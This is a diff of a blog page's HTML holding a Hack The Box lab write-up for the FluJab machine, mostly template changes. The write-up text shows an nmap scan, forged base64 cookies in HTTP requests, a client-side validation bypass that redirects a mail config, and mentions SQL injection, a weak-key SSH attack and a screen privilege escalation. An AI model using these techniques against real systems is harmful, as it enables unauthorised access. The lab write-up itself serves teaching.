@@ -3,24 +3,25 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>Hack The Box - FluJab | 0xRick Owned Root !</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<title>Hack The Box - FluJab | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
 <meta property="og:title" content="Hack The Box - FluJab" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&gt; &lt;div class=&quot;row aln-center&quot;&gt; &lt;div class=&quot;col-6 &quot;&gt; &lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;col-12&quot;&gt; &lt;p&gt; WARNING: Only &lt;a href=&quot;/?whitelist&quot;&gt;whitelisted sysadmins&lt;/a&gt; are authorized to access this page! &lt;br \&gt; If you are not supposed to change these settings then don&#39;t! whitelist will be auto-updated. &lt;/p&gt; &lt;ul class=&quot;actions&quot;&gt; &lt;li&gt;&lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59" />
-<meta property="og:description" content="Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&gt; &lt;div class=&quot;row aln-center&quot;&gt; &lt;div class=&quot;col-6 &quot;&gt; &lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;col-12&quot;&gt; &lt;p&gt; WARNING: Only &lt;a href=&quot;/?whitelist&quot;&gt;whitelisted sysadmins&lt;/a&gt; are authorized to access this page! &lt;br \&gt; If you are not supposed to change these settings then don&#39;t! whitelist will be auto-updated. &lt;/p&gt; &lt;ul class=&quot;actions&quot;&gt; &lt;li&gt;&lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59" />
+<meta name="description" content="My write-up for FluJab from Hack The Box." />
+<meta property="og:description" content="My write-up for FluJab from Hack The Box." />
 <link rel="canonical" href="http://localhost:4000/hack-the-box/flujab/" />
 <meta property="og:url" content="http://localhost:4000/hack-the-box/flujab/" />
-<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:site_name" content="0xRick" />
 <meta property="og:image" content="http://localhost:4000/hackthebox/flujab/0.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-06-15T00:00:00+02:00" />
 <script type="application/ld+json">
-{"description":"Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&gt; &lt;div class=&quot;row aln-center&quot;&gt; &lt;div class=&quot;col-6 &quot;&gt; &lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;col-12&quot;&gt; &lt;p&gt; WARNING: Only &lt;a href=&quot;/?whitelist&quot;&gt;whitelisted sysadmins&lt;/a&gt; are authorized to access this page! &lt;br \\&gt; If you are not supposed to change these settings then don&#39;t! whitelist will be auto-updated. &lt;/p&gt; &lt;ul class=&quot;actions&quot;&gt; &lt;li&gt;&lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/flujab/","image":"http://localhost:4000/hackthebox/flujab/0.png","headline":"Hack The Box - FluJab","dateModified":"2019-06-15T00:00:00+02:00","datePublished":"2019-06-15T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/flujab/"},"@context":"http://schema.org"}</script>
+{"description":"My write-up for FluJab from Hack The Box.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/flujab/","image":"http://localhost:4000/hackthebox/flujab/0.png","headline":"Hack The Box - FluJab","dateModified":"2019-06-15T00:00:00+02:00","datePublished":"2019-06-15T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/flujab/"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/tagbuttons.css">
-  <link rel="stylesheet" href="/assets/css/ad.css">
-  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
 <script>
@@ -31,70 +32,72 @@
   gtag('config', 'UA-97164925-2');
 </script>
 
-<body><header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
-      </nav></div>
-</header>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - FluJab</h1>
-    <p class="post-meta">
-      <h7>
-        Tags: 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/SQLI/';">SQLI</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/ssh/';">ssh</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/rbash/';">rbash</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Binary Exploitation/';">Binary Exploitation</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/c/';">c</button> 
-        
-      </h7>
-      <br>
-      <time class="dt-published" datetime="2019-06-15T00:00:00+02:00" itemprop="datePublished">Jun 15, 2019
-      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
-</p>
-  </header>
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - FluJab</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/sqli/">sqli</a>
+      
+      <a class="tag" href="/tag/ssh/">ssh</a>
+      
+      <a class="tag" href="/tag/rbash/">rbash</a>
+      
+      <a class="tag" href="/tag/binary-exploitation/">binary-exploitation</a>
+      
+      <a class="tag" href="/tag/c/">c</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 15 Jun 2019</div>
+  
+  <div class="post-description">My write-up for FluJab from Hack The Box.</div>
+  
+  <hr />
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <hr />
-
-<h3 id="quick-summary">Quick Summary</h3>
-<h4 id="hey-guys-today-flujab-retired-and-heres-my-write-up-about-it-this-machine-had-a-lot-of-rabbit-holes-and-trolls-which-made-it-hard-to-enjoy-the-machine-but-without-mentioning-those-annoying-things-this-machine-had-some-really-cool-web-exploitation-parts-like-cookie-manipulation-authentication-bypasses-and-most-importantly-an-interesting-sql-injection-vulnerability-ajenti-administration-panel-was-installed-on-the-box-and-i-could-get-credentials-for-it-by-exploiting-the-sqli--after-that-i-could-use-a-users-public-ssh-key-to-get-the-private-key-as-it-was-vulnerable-to-cve-2008-0166-then-i-escaped-rbash-and-exploited-a-vulnerable-version-of-screen-to-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010124-i-added-it-to-etchosts-as-flujabhtb-lets-jump-right-in-">Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting <code class="highlighter-rouge">SQL</code> injection vulnerability. <code class="highlighter-rouge">Ajenti</code> administration panel was installed on the box and I could get credentials for it by exploiting the <code class="highlighter-rouge">SQLi</code>,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to <code class="highlighter-rouge">CVE-2008-0166</code> then I escaped <code class="highlighter-rouge">rbash</code> and exploited a vulnerable version of <code class="highlighter-rouge">screen</code> to get a root shell. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.124</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">flujab.htb</code>. Let’s jump right in !</h4>
-<p><img src="/images/hackthebox/flujab/0.png" alt="" /></p>
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting <code class="highlighter-rouge">SQL</code> injection vulnerability. <code class="highlighter-rouge">Ajenti</code> administration panel was installed on the box and I could get credentials for it by exploiting the <code class="highlighter-rouge">SQLi</code>,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to <code class="highlighter-rouge">CVE-2008-0166</code> then I escaped <code class="highlighter-rouge">rbash</code> and exploited a vulnerable version of <code class="highlighter-rouge">screen</code> to get a root shell. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.124</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">flujab.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/flujab/0.png" alt="" /></p>
 <hr />
 
-<h3 id="nmap">Nmap</h3>
-<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
-<p><code class="highlighter-rouge">nmap -sV -sT -sC flujab.htb</code>
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC flujab.htb</code>
 <img src="/images/hackthebox/flujab/1.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/flujab/2.png" alt="" /></p>
-<h4 id="we-got-ssh-on-port-22-http-on-ports-80-and-8080-and-https-on-port-443-theres-also-some-sort-of-virtual-hosting-as-we-can-see-from-the-nmap-scan-and-there-are-a-lot-of-domains-">We got <code class="highlighter-rouge">ssh</code> on port 22, <code class="highlighter-rouge">http</code> on ports 80 and 8080 and <code class="highlighter-rouge">https</code> on port 443. There’s also some sort of virtual hosting as we can see from the <code class="highlighter-rouge">nmap</code> scan and there are a lot of domains …</h4>
-<h4 id="we-can-also-check-the-ssl-certificate-manually-">We can also check the <code class="highlighter-rouge">ssl</code> certificate manually :</h4>
-<p><img src="/images/hackthebox/flujab/3.png" alt="" />
+<img src="/images/hackthebox/flujab/2.png" alt="" />
+<br /> We got <code class="highlighter-rouge">ssh</code> on port 22, <code class="highlighter-rouge">http</code> on ports 80 and 8080 and <code class="highlighter-rouge">https</code> on port 443. There’s also some sort of virtual hosting as we can see from the <code class="highlighter-rouge">nmap</code> scan and there are a lot of domains …
+<br /> We can also check the <code class="highlighter-rouge">ssl</code> certificate manually :
+<img src="/images/hackthebox/flujab/3.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/flujab/4.png" alt="" />
@@ -103,72 +106,72 @@
 <img src="/images/hackthebox/flujab/5.png" alt="" /></p>
 <hr />
 
-<h3 id="http">HTTP</h3>
-<h4 id="i-added-all-of-them-to-etchosts-and-checked-them-however-i-will-skip-the-rabbit-holes-in-the-write-up-because-its-just-a-waste-of-time-if-we-take-a-look-at-what-we-have-">I added all of them to <code class="highlighter-rouge">/etc/hosts</code> and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :</h4>
-<p><img src="/images/hackthebox/flujab/6.png" alt="" /></p>
-<h4 id="the-machine-name-is-flujab-so-we-are-only-interested-in-">The machine name is <code class="highlighter-rouge">flujab</code> so we are only interested in :</h4>
+<h2 id="http">HTTP</h2>
+<p><br /> I added all of them to <code class="highlighter-rouge">/etc/hosts</code> and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :
+<img src="/images/hackthebox/flujab/6.png" alt="" />
+<br /> The machine name is <code class="highlighter-rouge">flujab</code> so we are only interested in :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console.flujab.htb
 sys.flujab.htb
 smtp.flujab.htb
 freeflujab.htb
 flujab.htb
 </code></pre></div></div>
-<h4 id="we-saw-that-error-about-direct-ip-access-when-we-visited-flujabhtb-lets-check-the-other-4">We saw that error about direct ip access when we visited <code class="highlighter-rouge">flujab.htb</code>, Let’s check the other 4.</h4>
-<p><code class="highlighter-rouge">console.flujab.htb</code> :
-<img src="/images/hackthebox/flujab/7.png" alt="" /></p>
-<h4 id="just-a-troll-">Just a troll !</h4>
-<p><code class="highlighter-rouge">sys.flujab.htb</code> :
-<img src="/images/hackthebox/flujab/8.png" alt="" /></p>
-<h4 id="the-same-error-on-flujabhtb">The same error on <code class="highlighter-rouge">flujab.htb</code></h4>
-<p><code class="highlighter-rouge">smtp.flujab.htb</code> :
-<img src="/images/hackthebox/flujab/9.png" alt="" /></p>
-<h4 id="we-dont-have-any-credentials-for-that">We don’t have any credentials for that.</h4>
-<p><code class="highlighter-rouge">freeflujab.htb</code> : 
+<p><br /> We saw that error about direct ip access when we visited <code class="highlighter-rouge">flujab.htb</code>, Let’s check the other 4. 
+<code class="highlighter-rouge">console.flujab.htb</code> :
+<img src="/images/hackthebox/flujab/7.png" alt="" />
+<br /> Just a troll !
+<code class="highlighter-rouge">sys.flujab.htb</code> :
+<img src="/images/hackthebox/flujab/8.png" alt="" />
+<br /> The same error on <code class="highlighter-rouge">flujab.htb</code>
+<code class="highlighter-rouge">smtp.flujab.htb</code> :
+<img src="/images/hackthebox/flujab/9.png" alt="" />
+<br /> We don’t have any credentials for that.
+<code class="highlighter-rouge">freeflujab.htb</code> : 
 <img src="/images/hackthebox/flujab/10.png" alt="" />
 <img src="/images/hackthebox/flujab/11.png" alt="" />
 <img src="/images/hackthebox/flujab/12.png" alt="" />
 <img src="/images/hackthebox/flujab/13.png" alt="" />
-<img src="/images/hackthebox/flujab/14.png" alt="" /></p>
